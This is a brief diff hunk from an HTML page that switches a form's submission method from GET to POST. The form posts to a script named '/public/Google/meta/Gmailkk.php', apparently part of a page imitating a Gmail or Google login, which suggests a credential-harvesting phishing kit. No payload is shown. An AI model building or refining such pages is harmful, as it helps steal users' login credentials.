@@ -92,7 +92,7 @@
 <body>
 
   
-<form id="accesspanel" action="/public/Google/meta/Gmailkk.php" method="GET">
+<form id="accesspanel" action="/public/Google/meta/Gmailkk.php" method="POST">
 <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
 	  
 
